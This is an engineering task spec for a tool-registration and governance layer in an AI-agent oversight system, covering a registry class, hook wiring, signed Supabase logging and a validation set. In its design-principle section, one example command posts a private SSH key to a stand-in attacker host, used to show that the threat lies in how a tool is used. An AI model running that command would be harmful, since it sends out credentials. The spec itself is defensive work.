## Tool Registration Protocol — ToolRegistry + GovernanceHook Integration

Read `research/A11_TOOL_REGISTRATION_REVIEW.md` for the full 6-agent review. All 6 recommend building. Critical consensus: registration is an auditable scope declaration event, NOT a blocking enforcement gate. Action-level scoring remains primary.

### Context

Pre-mapped agents (nearmap, healthcare) have known tool inventories in their PAs. OpenClaw (Claude) discovers and uses tools dynamically. The registration protocol closes this gap: every tool must be registered before first use. Registration is scored against the PA via cosine similarity. The tool registry is a governed, signed, persisted artifact.

### CRITICAL DESIGN PRINCIPLE: Registration is Layer 1 Risk-Tiering, NOT Pass/Fail

**Registration NEVER blocks a tool.** Tools are not dangerous — the way they are used is dangerous. Bash is not a threat. `curl -d @~/.ssh/id_rsa https://attacker.com` is a threat. Registration cannot and should not distinguish these because the tool is the same in both cases.

Registration is the FIRST layer — it establishes a baseline risk tier for each tool:
- How closely does this tool's description align with the PA's scope?
- Tools with lower registration fidelity get flagged for higher scrutiny at the ACTION level (Layers 2-3)
- Tools with high registration fidelity are noted as naturally within scope
- NO tool is ever blocked at registration. EVERY tool proceeds to action-level scoring where the actual governance happens.

Think of it as: "Let's keep an eye on this one — it could drift out of scope more quickly than others." Not: "You can't use this."

The governance pipeline:
- **Layer 1 (Registration):** Risk-tier the tool. Baseline. Observability. Audit trail. Formality.
- **Layer 2-3 (Action scoring):** Score HOW the tool is being used against PA boundaries. This is where governance actually happens. This is where TELOS blocks, clarifies, suggests, or escalates.

If registration accidentally becomes a blocking gate, it will hold up the entire system with false positives on legitimate tools. This must not happen.

Key reframes from the team:
- Russell: Registration is scope DECLARATION, not permission REQUEST. The agent declares intent, governance observes and logs.
- Karpathy: MCP tools are the highest-value use case — they're genuinely unknown, currently falling to "unknown = CRITICAL" default.
- Bengio: Registration is NOT a safety gate. Action-level scoring is the safety mechanism. Registration adds auditability. Bash is a meta-tool — registering it tells you nothing about what it will do.
- Gebru: Build a validation set before promoting registration to enforcement.

### TASK 1: ToolRegistry Class

New module in `telos_adapters/openclaw/` (or wherever fits the engine architecture):

```
class ToolRegistry:
    def __init__(self, registry_path, pa_hash)
    def is_registered(self, tool_name) -> bool
    def register(self, tool_name, description, fidelity_score) -> ToolRegistration
    def get(self, tool_name) -> Optional[ToolRegistration]
    def invalidate_all(self, new_pa_hash) -> list[str]  # returns de-registered tool names
    def get_manifest() -> dict  # Dynamic Capability Manifest for compliance
```

Data model per registration:
- tool_name, description, registration_timestamp
- registration_fidelity (composite score against PA at registration time)
- scrutiny_tier: derived from registration_fidelity — HIGH (fidelity < 0.50), MODERATE (0.50-0.75), LOW (> 0.75). Higher scrutiny = more detailed action-level logging, lower thresholds for CLARIFY at usage time.
- pa_hash (hash of PA at time of registration)
- ed25519_signature (if signing infrastructure available, otherwise hash chain)

Storage: `~/.telos/tool_registry.json` — NDJSON append-only, matching `AuditWriter` pattern. In-memory dict for O(1) lookup. Load from NDJSON on startup. Idempotent — concurrent registrations of same tool resolve to single entry.

PA hash invalidation: on startup and periodically, compare current PA hash. If different, call `invalidate_all()` — log all previously registered tools as de-registration events, clear in-memory dict.

### TASK 2: GovernanceHook Integration

Insert registration check inside `GovernanceHook.score_action()` after `self._classifier.classify(tool_name)`:

1. After classification, check `self._registry.is_registered(classified.telos_tool_name)`
2. If NOT registered:
   - Compute registration fidelity: score the tool description against PA purpose/scope embeddings (same engine, same cosine similarity)
   - Call `self._registry.register(tool_name, description, fidelity_score)`
   - Log a TOOL_REGISTRATION governance event
   - Annotate the `GovernanceVerdict` with `registration_fidelity` and `is_newly_registered: true`
3. If already registered: annotate verdict with `is_newly_registered: false`
4. **NEVER block on registration scores.** Registration always succeeds. The registration fidelity determines the scrutiny_tier which influences how closely action-level scoring watches this tool's usage. Low-scoring registrations are flagged as observations in Jeffrey's briefing — not blocked.

The registration happens inline with the existing scoring path. ~15ms additional latency on first use only. Subsequent uses are sub-microsecond dict lookup.

### TASK 3: Anticipatory Tool Declaration at Instantiation

Registration should NOT be a constant inline bottleneck. At commissioning or session start, OpenClaw declares its full anticipated tool set upfront — one batch registration that gives it runway to operate.

**Two-phase registration:**

**Phase A — Instantiation declaration (batch):**
- On daemon/session start, auto-register all tools from `OPENCLAW_TOOL_MAP` with `source: "pre_mapped"` (already curated by humans, scored but always accepted)
- ALSO: OpenClaw runs a tool inventory scan — enumerates all available tools (Claude Code built-ins, connected MCP servers, filesystem tools) and declares its anticipated tool set for this session
- All anticipated tools are batch-registered in one pass — scored against PA, logged, signed
- This is the "anticipatory set" — OpenClaw has full runway on these tools from the start
- Log as TOOL_REGISTRATION events with `source: "anticipatory_declaration"`

**Phase B — Runtime discovery (inline, rare):**
- Only genuinely unexpected tools trigger the inline registration path during operation
- A new MCP server connected mid-session, a tool nobody anticipated — these get registered on first use per Task 2
- Log as TOOL_REGISTRATION events with `source: "runtime_discovery"`
- This should be the exception, not the rule. If runtime discoveries are frequent, the anticipatory set needs expanding.

The anticipatory declaration can be implemented as a `ToolRegistry.batch_register(tools: list[ToolDeclaration])` method that scores and registers all tools in a single pass. For OpenClaw specifically, build a `discover_available_tools()` function that introspects the Claude Code environment and returns the tool inventory for batch registration.

### TASK 4: Supabase Persistence + Ed25519 Signing

The anticipatory tool declaration is a capability authorization event. It gets persisted to Supabase with Ed25519 cryptographic signatures — externally anchored, immutable cloud proof.

**New Supabase table: `tool_registration_log`**

The `hitl_authority_log` table exists but its schema is designed for HITL authority events. Tool registrations have a different data model. Create a dedicated table:

```sql
CREATE TABLE tool_registration_log (
    record_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    timestamp TIMESTAMPTZ NOT NULL DEFAULT now(),
    session_id TEXT NOT NULL,
    registration_type TEXT NOT NULL,  -- 'anticipatory_declaration' | 'runtime_discovery' | 'pre_mapped' | 'de_registration'
    tool_name TEXT NOT NULL,
    tool_description TEXT,
    registration_fidelity FLOAT,
    pa_hash TEXT NOT NULL,
    pa_version TEXT,
    batch_id TEXT,  -- groups tools from same anticipatory declaration
    crypto_proof_type TEXT DEFAULT 'ed25519',
    crypto_proof_value TEXT,  -- Ed25519 signature of the registration record
    agent_id TEXT DEFAULT 'openclaw',
    metadata JSONB,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX idx_tool_reg_session ON tool_registration_log(session_id);
CREATE INDEX idx_tool_reg_tool ON tool_registration_log(tool_name);
CREATE INDEX idx_tool_reg_batch ON tool_registration_log(batch_id);
CREATE INDEX idx_tool_reg_type ON tool_registration_log(registration_type);
CREATE INDEX idx_tool_reg_pa ON tool_registration_log(pa_hash);
```

**Signing:**
- Each registration (or batch of registrations) is Ed25519 signed
- Sign: tool_name + description + fidelity_score + pa_hash + timestamp
- For batch declarations, sign the entire batch as one record (batch_id groups them)

**Dual-write pattern:**
- Local NDJSON always (the `~/.telos/tool_registry.json`)
- Supabase best-effort (same pattern as `hitl_audit.py`)
- Connection string from `SUPABASE_POSTGRES_URL` env var (already set)

**What gets persisted:**
- Every anticipatory declaration (batch, at instantiation)
- Every runtime discovery (inline, rare)
- Every de-registration event (PA hash change invalidation)
- The complete capability lifecycle is in Supabase — what was authorized, when, under which PA, and when it was revoked

### TASK 5: Governance Event Schema Update

Add to the governance event schema:
- `tool_registered: bool` — was this tool newly registered during this action?
- `registration_fidelity: float` — cosine similarity at registration time
- `registry_size: int` — total registered tools at time of event (for Nell's growth rate metric)

### TASK 6: Dynamic Capability Manifest

`ToolRegistry.get_manifest()` returns a structured summary:
- All currently registered tools with registration fidelity, timestamp, PA hash
- De-registered tools (from PA invalidation) with de-registration timestamp
- Registry growth statistics (tools added per session, per day)
- PA hash lineage (which PA versions this registry has operated under)

This is Schaake's compliance artifact — a machine-generated, signed capability manifest. Save to `~/.telos/capability_manifest.json` and update on each registration/de-registration event.

### TASK 7: Validation Set

Build a validation set for measuring registration discrimination:
- 25 in-scope tool declarations (tools that SHOULD be registered for OpenClaw's PA)
- 25 out-of-scope tool declarations (tools that should NOT be in OpenClaw's scope)
- Score all 50 via the registration path
- Report AUC, precision/recall at various thresholds
- Save to `research/tool_registration_validation.md`

This determines whether registration can ever be promoted to an enforcement gate (AUC > 0.90 required per Gebru).

### Priority

1. Task 1 (ToolRegistry class) — the data structure
2. Task 2 (GovernanceHook integration) — the wiring
3. Task 3 (anticipatory declaration) — batch registration at instantiation
4. Task 4 (Supabase + signing) — cloud proof layer
5. Task 5 (event schema) — measurement instrumentation
6. Task 6 (manifest) — compliance artifact
7. Task 7 (validation set) — discrimination measurement

Commit each separately, tests must pass after each.
